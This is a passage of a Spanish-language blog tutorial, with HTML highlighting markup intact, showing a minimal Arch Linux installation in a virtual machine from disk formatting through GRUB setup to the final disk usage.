Disk /dev/sda: &lt;span class="m"&gt;4&lt;/span&gt; GiB, &lt;span class="m"&gt;4294967296&lt;/span&gt; bytes, &lt;span class="m"&gt;8388608&lt;/span&gt; sectors
Units: sectors of &lt;span class="m"&gt;1&lt;/span&gt; * &lt;span class="nv"&gt;512&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;512&lt;/span&gt; bytes
Sector size &lt;span class="o"&gt;(&lt;/span&gt;logical/physical&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
I/O size &lt;span class="o"&gt;(&lt;/span&gt;minimum/optimal&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
Disklabel type: gpt
Disk identifier: A45FE619-7FFC-4EA2-8253-628FD2138198

Device       Start     End Sectors  Size Type
/dev/sda1     &lt;span class="m"&gt;2048&lt;/span&gt; &lt;span class="m"&gt;7317503&lt;/span&gt; &lt;span class="m"&gt;7315456&lt;/span&gt;  &lt;span class="m"&gt;3&lt;/span&gt;.5G Linux filesystem
/dev/sda2  &lt;span class="m"&gt;7317504&lt;/span&gt; &lt;span class="m"&gt;8388574&lt;/span&gt; &lt;span class="m"&gt;1071071&lt;/span&gt;  523M Linux swap


Disk /dev/loop0: &lt;span class="m"&gt;318&lt;/span&gt;.9 MiB, &lt;span class="m"&gt;334385152&lt;/span&gt; bytes, &lt;span class="m"&gt;653096&lt;/span&gt; sectors
Units: sectors of &lt;span class="m"&gt;1&lt;/span&gt; * &lt;span class="nv"&gt;512&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;512&lt;/span&gt; bytes
Sector size &lt;span class="o"&gt;(&lt;/span&gt;logical/physical&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
I/O size &lt;span class="o"&gt;(&lt;/span&gt;minimum/optimal&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
root@archiso ~ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Siguiendo el manual, necesitamos formatear las particiones según las funciones que van a desempeñar, montando los discos en &lt;em&gt;/mnt/&lt;/em&gt; y sus subcarpetas. Como no tenemos particiones para &lt;em&gt;/home/&lt;/em&gt;, &lt;em&gt;/var/&lt;/em&gt; y &lt;em&gt;/tmp/&lt;/em&gt;, con montar la primera nos basta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@archiso ~ &lt;span class="c1"&gt;# mkfs.ext4 /dev/sda1&lt;/span&gt;
mke2fs &lt;span class="m"&gt;1&lt;/span&gt;.42.13 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;-May-2015&lt;span class="o"&gt;)&lt;/span&gt;
Creating filesystem with &lt;span class="m"&gt;914432&lt;/span&gt; 4k blocks and &lt;span class="m"&gt;228928&lt;/span&gt; inodes
Filesystem UUID: 295665be-7b09-4cad-9689-7fed5471bf25
Superblock backups stored on blocks:
        &lt;span class="m"&gt;32768&lt;/span&gt;, &lt;span class="m"&gt;98304&lt;/span&gt;, &lt;span class="m"&gt;163840&lt;/span&gt;, &lt;span class="m"&gt;229376&lt;/span&gt;, &lt;span class="m"&gt;294912&lt;/span&gt;, &lt;span class="m"&gt;819200&lt;/span&gt;, &lt;span class="m"&gt;884736&lt;/span&gt;

Allocating group tables: &lt;span class="k"&gt;done&lt;/span&gt;
Writing inode tables: &lt;span class="k"&gt;done&lt;/span&gt;
Creating journal &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;16384&lt;/span&gt; blocks&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="k"&gt;done&lt;/span&gt;
Writing superblocks and filesystem accounting information: &lt;span class="k"&gt;done&lt;/span&gt;

root@archiso ~ &lt;span class="c1"&gt;# mount /dev/sda1 /mnt&lt;/span&gt;
root@archiso ~ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Preparamos la partición de &lt;em&gt;swap&lt;/em&gt; y la dejamos activada. Eso nos permitirá utilizarla durante la instalación, y que esta la detecte automáticamente para crear el fichero &lt;em&gt;/etc/fstab&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@archiso ~ &lt;span class="c1"&gt;# mkswap /dev/sda2&lt;/span&gt;
Setting up swapspace version &lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="nv"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;523&lt;/span&gt; MiB &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;548380672&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;
no label, &lt;span class="nv"&gt;UUID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;85cf7f55-cd3c-4002-9729-2d89ebadf942
root@archiso ~ &lt;span class="c1"&gt;# swapon /dev/sda2&lt;/span&gt;
root@archiso ~ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos verificar que está activada con un comando &lt;strong&gt;free&lt;/strong&gt;, por ejemplo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@archiso ~ &lt;span class="c1"&gt;# free -m&lt;/span&gt;
              total        used        free      shared  buff/cache   available
Mem:            &lt;span class="m"&gt;498&lt;/span&gt;          &lt;span class="m"&gt;20&lt;/span&gt;         &lt;span class="m"&gt;252&lt;/span&gt;          &lt;span class="m"&gt;44&lt;/span&gt;         &lt;span class="m"&gt;224&lt;/span&gt;         &lt;span class="m"&gt;413&lt;/span&gt;
Swap:           &lt;span class="m"&gt;522&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;         &lt;span class="m"&gt;522&lt;/span&gt;
root@archiso ~ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Instalación y configuración&lt;/h2&gt;
&lt;p&gt;El primer paso es descargar todos los paquetes de internet, mediante el comando &lt;strong&gt;pacstrap&lt;/strong&gt;. Para ello se recomienda editar el fichero &lt;em&gt;/etc/pacman.d/mirrorlist&lt;/em&gt; para utilizar los &lt;em&gt;mirrors&lt;/em&gt; que nos convengan, y que serán también los que use el sistema instalado. Como se pueden cambiar a &lt;em&gt;posteriori&lt;/em&gt; y los que hay me parecen bien, no vamos a cambiar nada.&lt;/p&gt;
&lt;p&gt;Así pues, lanzamos el &lt;strong&gt;pacstrap&lt;/strong&gt; tal como indica el manual de instalación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@archiso ~ &lt;span class="c1"&gt;# pacstrap /mnt base&lt;/span&gt;
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Creating install root at /mnt
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Installing packages to /mnt
:: Synchronizing package databases...
 core                                                 &lt;span class="m"&gt;119&lt;/span&gt;.7 KiB   783K/s &lt;span class="m"&gt;00&lt;/span&gt;:00 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="c1"&gt;############################################] 100%&lt;/span&gt;
 extra                                               &lt;span class="m"&gt;1755&lt;/span&gt;.7 KiB   810K/s &lt;span class="m"&gt;00&lt;/span&gt;:02 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="c1"&gt;############################################] 100%&lt;/span&gt;
 community                                              &lt;span class="m"&gt;3&lt;/span&gt;.5 MiB   851K/s &lt;span class="m"&gt;00&lt;/span&gt;:04 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="c1"&gt;############################################] 100%&lt;/span&gt;
:: There are &lt;span class="m"&gt;50&lt;/span&gt; members in group base:
:: Repository core
   &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; bash  &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; bzip2  &lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; coreutils  &lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; cryptsetup  &lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; device-mapper  &lt;span class="m"&gt;6&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; dhcpcd  &lt;span class="m"&gt;7&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; diffutils  &lt;span class="m"&gt;8&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; e2fsprogs  &lt;span class="m"&gt;9&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; file
   &lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; filesystem  &lt;span class="m"&gt;11&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; findutils  &lt;span class="m"&gt;12&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; gawk  &lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; gcc-libs  &lt;span class="m"&gt;14&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; gettext  &lt;span class="m"&gt;15&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; glibc  &lt;span class="m"&gt;16&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; grep  &lt;span class="m"&gt;17&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; gzip  &lt;span class="m"&gt;18&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; inetutils  &lt;span class="m"&gt;19&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; iproute2
   &lt;span class="m"&gt;20&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; iputils  &lt;span class="m"&gt;21&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; jfsutils  &lt;span class="m"&gt;22&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; less  &lt;span class="m"&gt;23&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; licenses  &lt;span class="m"&gt;24&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; linux  &lt;span class="m"&gt;25&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; logrotate  &lt;span class="m"&gt;26&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; lvm2  &lt;span class="m"&gt;27&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; man-db  &lt;span class="m"&gt;28&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; man-pages  &lt;span class="m"&gt;29&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; mdadm
   &lt;span class="m"&gt;30&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; nano  &lt;span class="m"&gt;31&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; netctl  &lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; pacman  &lt;span class="m"&gt;33&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; pciutils  &lt;span class="m"&gt;34&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; pcmciautils  &lt;span class="m"&gt;35&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; perl  &lt;span class="m"&gt;36&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; procps-ng  &lt;span class="m"&gt;37&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; psmisc  &lt;span class="m"&gt;38&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; reiserfsprogs
   &lt;span class="m"&gt;39&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; s-nail  &lt;span class="m"&gt;40&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; sed  &lt;span class="m"&gt;41&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; shadow  &lt;span class="m"&gt;42&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; sysfsutils  &lt;span class="m"&gt;43&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; systemd-sysvcompat  &lt;span class="m"&gt;44&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; tar  &lt;span class="m"&gt;45&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; texinfo  &lt;span class="m"&gt;46&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; usbutils  &lt;span class="m"&gt;47&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; util-linux
   &lt;span class="m"&gt;48&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; vi  &lt;span class="m"&gt;49&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; which  &lt;span class="m"&gt;50&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xfsprogs

Enter a selection &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;all&lt;span class="o"&gt;)&lt;/span&gt;:
...  
Total Download Size:   &lt;span class="m"&gt;185&lt;/span&gt;.14 MiB
Total Installed Size:  &lt;span class="m"&gt;572&lt;/span&gt;.80 MiB

:: Proceed with installation? &lt;span class="o"&gt;[&lt;/span&gt;Y/n&lt;span class="o"&gt;]&lt;/span&gt;
...
pacstrap /mnt base  &lt;span class="m"&gt;51&lt;/span&gt;.53s user &lt;span class="m"&gt;124&lt;/span&gt;.01s system &lt;span class="m"&gt;39&lt;/span&gt;% cpu &lt;span class="m"&gt;7&lt;/span&gt;:25.44 total
root@archiso ~ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con todos los paquetes instalados, empezaremos a configurar el sistema. El primer candidato es generar el fichero &lt;em&gt;/etc/fstab&lt;/em&gt;. Existe un &lt;em&gt;script&lt;/em&gt; llamado &lt;strong&gt;genfstab&lt;/strong&gt; que va a generar un fichero &lt;em&gt;fstab&lt;/em&gt; basado en lo que tenemos ahora mismo activado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@archiso ~ &lt;span class="c1"&gt;# genfstab -p /mnt &amp;gt;&amp;gt; /mnt/etc/fstab&lt;/span&gt;
root@archiso ~ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El resto de configuración se hace en un entorno &lt;strong&gt;chroot&lt;/strong&gt; sobre la carpeta instalada, que es donde tenemos montado el disco raíz. La imagen de instalación nos ofrece un &lt;em&gt;script&lt;/em&gt; de &lt;strong&gt;chroot&lt;/strong&gt; que ya se encarga de montar los sistemas de ficheros especiales como &lt;em&gt;/proc/&lt;/em&gt;, &lt;em&gt;/dev/&lt;/em&gt; o &lt;em&gt;/sys/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@archiso ~ &lt;span class="c1"&gt;# arch-chroot /mnt&lt;/span&gt;
sh-4.3#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Los siguientes pasos son burocráticos y los mismos que en otras distribuciones: poner un nombre a la máquina, configurar el huso horario, generar &lt;em&gt;locales&lt;/em&gt; y configurar el teclado a nivel permanente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sh-4.3# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;archlinux&amp;quot;&lt;/span&gt; &amp;gt; /etc/hostname
sh-4.3# ln -s /usr/share/zoneinfo/Europe/Madrid /etc/localtime
sh-4.3# grep -v ^# /etc/locale.gen
es_ES.UTF-8 UTF-8
sh-4.3# locale-gen
Generating locales...
  es_ES.UTF-8... &lt;span class="k"&gt;done&lt;/span&gt;
Generation complete.
sh-4.3# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LANG=es_ES.UTF-8&amp;quot;&lt;/span&gt; &amp;gt; /etc/locale.conf
sh-4.3# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;KEYMAP=es&amp;quot;&lt;/span&gt; &amp;gt; /etc/vconsole.conf
sh-4.3#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso no es fácil, y aunque puede hacerse a &lt;em&gt;posteriori&lt;/em&gt;, merece la pena prestar atención. Para la configuración de red, necesitamos activar el servicio &lt;em&gt;systemd-networkd&lt;/em&gt;, que va a leer los ficheros de configuración en &lt;em&gt;/etc/systemd/network/&lt;/em&gt; para levantar las interfaces con los parámetros adecuados.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sh-4.3# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; systemd-networkd
Created symlink /etc/systemd/system/multi-user.target.wants/systemd-networkd.service → /usr/lib/systemd/system/systemd-networkd.service.
Created symlink /etc/systemd/system/sockets.target.wants/systemd-networkd.socket → /usr/lib/systemd/system/systemd-networkd.socket.
sh-4.3# cat /etc/systemd/network/wired.network
&lt;span class="o"&gt;[&lt;/span&gt;Match&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;enp0s3

&lt;span class="o"&gt;[&lt;/span&gt;Network&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;DHCP&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;ipv4
sh-4.3#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En caso de querer obtener los &lt;em&gt;DNS&lt;/em&gt; de forma automática necesitamos habilitar el servicio &lt;em&gt;systemd-resolved&lt;/em&gt;, que nos va a dejar un &lt;em&gt;resolv.conf&lt;/em&gt; en &lt;em&gt;/run/systemd/resolve/&lt;/em&gt;; con un simple enlace va a ser suficiente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sh-4.3# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; systemd-resolved
Created symlink /etc/systemd/system/multi-user.target.wants/systemd-resolved.service → /usr/lib/systemd/system/systemd-resolved.service.
sh-4.3# rm /etc/resolv.conf
sh-4.3# ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf
sh-4.3#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Generamos un &lt;em&gt;initramfs&lt;/em&gt; para que en el siguiente arranque podamos disfrutar de todo lo nuevo que hemos configurado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sh-4.3# mkinitcpio -p &lt;span class="nv"&gt;linux&lt;/span&gt;
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Building image from preset: /etc/mkinitcpio.d/linux.preset: &lt;span class="s1"&gt;&amp;#39;default&amp;#39;&lt;/span&gt;
  -&amp;gt; -k /boot/vmlinuz-linux -c /etc/mkinitcpio.conf -g /boot/initramfs-linux.img
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Starting build: &lt;span class="m"&gt;4&lt;/span&gt;.5.4-1-ARCH
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;base&lt;span class="o"&gt;]&lt;/span&gt;
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;udev&lt;span class="o"&gt;]&lt;/span&gt;
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;autodetect&lt;span class="o"&gt;]&lt;/span&gt;
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;modconf&lt;span class="o"&gt;]&lt;/span&gt;
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;block&lt;span class="o"&gt;]&lt;/span&gt;
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;filesystems&lt;span class="o"&gt;]&lt;/span&gt;
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;keyboard&lt;span class="o"&gt;]&lt;/span&gt;
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;fsck&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Generating module &lt;span class="nv"&gt;dependencies&lt;/span&gt;
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Creating gzip-compressed initcpio image: /boot/initramfs-linux.img
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Image generation &lt;span class="nv"&gt;successful&lt;/span&gt;
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Building image from preset: /etc/mkinitcpio.d/linux.preset: &lt;span class="s1"&gt;&amp;#39;fallback&amp;#39;&lt;/span&gt;
  -&amp;gt; -k /boot/vmlinuz-linux -c /etc/mkinitcpio.conf -g /boot/initramfs-linux-fallback.img -S &lt;span class="nv"&gt;autodetect&lt;/span&gt;
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Starting build: &lt;span class="m"&gt;4&lt;/span&gt;.5.4-1-ARCH
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;base&lt;span class="o"&gt;]&lt;/span&gt;
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;udev&lt;span class="o"&gt;]&lt;/span&gt;
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;modconf&lt;span class="o"&gt;]&lt;/span&gt;
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;block&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; WARNING: Possibly missing firmware &lt;span class="k"&gt;for&lt;/span&gt; module: &lt;span class="nv"&gt;aic94xx&lt;/span&gt;
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; WARNING: Possibly missing firmware &lt;span class="k"&gt;for&lt;/span&gt; module: wd719x
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;filesystems&lt;span class="o"&gt;]&lt;/span&gt;
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;keyboard&lt;span class="o"&gt;]&lt;/span&gt;
  -&amp;gt; Running build hook: &lt;span class="o"&gt;[&lt;/span&gt;fsck&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Generating module &lt;span class="nv"&gt;dependencies&lt;/span&gt;
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Creating gzip-compressed initcpio image: /boot/initramfs-linux-fallback.img
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Image generation successful
sh-4.3#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente nos podemos dedicar a administrar usuarios y sus contraseñas. Como esto también se puede hacer a &lt;em&gt;posteriori&lt;/em&gt;, voy solo a desbloquear al usuario &lt;strong&gt;root&lt;/strong&gt;, dándole una &lt;em&gt;password&lt;/em&gt; adecuada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sh-4.3# passwd
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
sh-4.3#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos el disco raíz perfectamente preparado, y un &lt;em&gt;kernel&lt;/em&gt; listo para el arranque.&lt;/p&gt;
&lt;h2&gt;Instalando el bootloader&lt;/h2&gt;
&lt;p&gt;Para que el &lt;em&gt;kernel&lt;/em&gt;, &lt;em&gt;initrd&lt;/em&gt; y el disco puedan funcionar, es necesario que el disco tenga algún tipo de estructura que le indique como hacerlo. El nombre genérico para esta pieza de &lt;em&gt;software&lt;/em&gt; es &lt;em&gt;bootloader&lt;/em&gt;. De todos los que hay (que no son pocos), vamos a usar un viejo amigo: &lt;strong&gt;GRUB&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sh-4.3# pacman -S grub
resolving dependencies...
looking &lt;span class="k"&gt;for&lt;/span&gt; conflicting packages...

Packages &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; grub-1:2.02.beta2-6

Total Download Size:    &lt;span class="m"&gt;5&lt;/span&gt;.27 MiB
Total Installed Size:  &lt;span class="m"&gt;25&lt;/span&gt;.27 MiB

:: Proceed with installation? &lt;span class="o"&gt;[&lt;/span&gt;Y/n&lt;span class="o"&gt;]&lt;/span&gt; y
...
sh-4.3#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Instalamos el código de &lt;em&gt;boot&lt;/em&gt; en el &lt;em&gt;MBR&lt;/em&gt; con la herramienta que &lt;strong&gt;GRUB&lt;/strong&gt; nos ofrece, siguiendo el manual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sh-4.3# grub-install --target&lt;span class="o"&gt;=&lt;/span&gt;i386-pc /dev/sda
Installing &lt;span class="k"&gt;for&lt;/span&gt; i386-pc platform.
grub-install: warning: this GPT partition label contains no BIOS Boot Partition&lt;span class="p"&gt;;&lt;/span&gt; embedding won&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t be possible.
grub-install: warning: Embedding is not possible.  GRUB can only be installed in this setup by using blocklists.  However, blocklists are UNRELIABLE and their use is discouraged..
grub-install: error: will not proceed with blocklists.
sh-4.3#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso ha fallado, pero siguiendo el manual de instalación, eso se corrige mediante el uso del &lt;em&gt;flag&lt;/em&gt; &lt;strong&gt;--force&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sh-4.3# grub-install --target&lt;span class="o"&gt;=&lt;/span&gt;i386-pc /dev/sda --force
Installing &lt;span class="k"&gt;for&lt;/span&gt; i386-pc platform.
grub-install: warning: this GPT partition label contains no BIOS Boot Partition&lt;span class="p"&gt;;&lt;/span&gt; embedding won&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t be possible.
grub-install: warning: Embedding is not possible.  GRUB can only be installed in this setup by using blocklists.  However, blocklists are UNRELIABLE and their use is discouraged..
Installation finished. No error reported.
sh-4.3#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como ya hemos conseguido instalar &lt;strong&gt;GRUB&lt;/strong&gt; de forma exitosa, nos queda generar un fichero de configuración del &lt;em&gt;bootloader&lt;/em&gt;, tal como dice el manual de instalación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sh-4.3# grub-mkconfig -o /boot/grub/grub.cfg
Generating grub configuration file ...
Found linux image: /boot/vmlinuz-linux
Found initrd image: /boot/initramfs-linux.img
Found fallback initramfs image: /boot/initramfs-linux-fallback.img
&lt;span class="k"&gt;done&lt;/span&gt;
sh-4.3#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto queda una instalación básica. Solo nos queda salir del entorno enjaulado, apagar la máquina, quitar el disco de instalación y encender.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sh-4.3# &lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;span class="nb"&gt;exit&lt;/span&gt;
arch-chroot /mnt  &lt;span class="m"&gt;10&lt;/span&gt;.17s user &lt;span class="m"&gt;19&lt;/span&gt;.71s system &lt;span class="m"&gt;3&lt;/span&gt;% cpu &lt;span class="m"&gt;14&lt;/span&gt;:10.46 total
root has logged on pts/1 from &lt;span class="m"&gt;10&lt;/span&gt;.0.2.2.
root@archiso ~ &lt;span class="c1"&gt;# reboot&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Resultado final&lt;/h2&gt;
&lt;p&gt;Tras actualizar y limpiar caché de paquetes, vemos que tenemos una distribución minimalista con 743mb de disco ocupados y 10mb de memoria.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# df -h&lt;/span&gt;
S.ficheros     Tamaño Usados  Disp Uso% Montado en
dev              247M      &lt;span class="m"&gt;0&lt;/span&gt;  247M   &lt;span class="m"&gt;0&lt;/span&gt;% /dev
run              250M   292K  249M   &lt;span class="m"&gt;1&lt;/span&gt;% /run
/dev/sda1        &lt;span class="m"&gt;3&lt;/span&gt;,4G   743M  &lt;span class="m"&gt;2&lt;/span&gt;,5G  &lt;span class="m"&gt;23&lt;/span&gt;% /
